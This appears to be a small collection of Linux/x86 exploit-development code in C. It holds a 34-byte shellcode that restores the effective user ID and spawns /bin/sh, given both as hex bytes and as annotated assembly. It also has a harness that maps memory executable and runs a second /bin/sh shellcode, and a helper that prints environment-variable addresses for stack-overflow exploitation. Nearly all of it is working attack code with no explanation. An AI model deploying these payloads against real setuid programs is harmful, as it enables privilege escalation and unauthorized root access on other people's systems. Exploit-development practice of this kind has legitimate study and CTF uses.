/*
 *
 * linux/x86 setreuid(geteuid(),geteuid()),execve("/bin/sh",0,0) 34byte universal shellcode
 *
 * blue9057 root@blue9057.com
 *
 */
int main()
{
    char shellcode[]="\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46"
                              "\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68"
                              "\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80";
    //setreuid(geteuid(),geteuid());
    //execve("/bin/sh",0,0);
    __asm__(""
            "push $0x31;"
            "pop %eax;"
            "cltd;"
            "int $0x80;"        // geteuid();
            "mov %eax, %ebx;"
            "mov %eax, %ecx;"
            "push $0x46;"    // setreuid(geteuid(),geteuid());
            "pop %eax;"
            "int $0x80;"
            "mov $0xb, %al;"
            "push %edx;"
            "push $0x68732f6e;"
            "push $0x69622f2f;"
            "mov %esp, %ebx;"
            "mov %edx, %ecx;"
            "int $0x80;"        // execve("/bin/sh",0,0);
            "");
}


/*测试shellcode的程序，没有提权*/
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
int (*sc)();
unsigned char shellcode[] = \
"\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80"
"\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68";

main()
{
    printf("Shellcode Length: %d\n", sizeof(shellcode)-1);
    void *ptr = mmap(0, 30,
            PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON
            | MAP_PRIVATE, -1, 0);

    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }

    memcpy(ptr, shellcode, sizeof(shellcode));
    sc = ptr;

    sc();
}

/*获取环境变量地址*/
#include <stdlib.h>
int main(int argc, char *argv[])
{
    char *addr;
    addr = getenv(argv[1]);
    printf("%s is at %p\n",argv[1],addr);
}